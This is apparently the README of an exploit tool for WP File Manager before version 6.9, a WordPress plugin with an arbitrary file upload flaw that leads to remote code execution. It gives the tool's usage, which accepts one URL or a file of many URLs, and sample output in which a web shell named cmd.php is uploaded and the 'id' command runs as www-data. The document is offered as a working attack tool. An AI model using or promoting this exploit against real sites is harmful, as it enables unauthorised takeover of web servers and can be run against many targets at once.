# wp-file-manager
WP File Manager < 6.9 - Arbitrary File Upload leading to RCE

```
usage: wp-file-manager.py [-h] [-u URL] [-f FILE]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL of host to check will need http or https
  -f FILE, --file FILE  File of URLS to check
```

```
[+] Testing https://localhost [+]
[*]Shell Uploaded https://localhost/wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=id[*]
Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
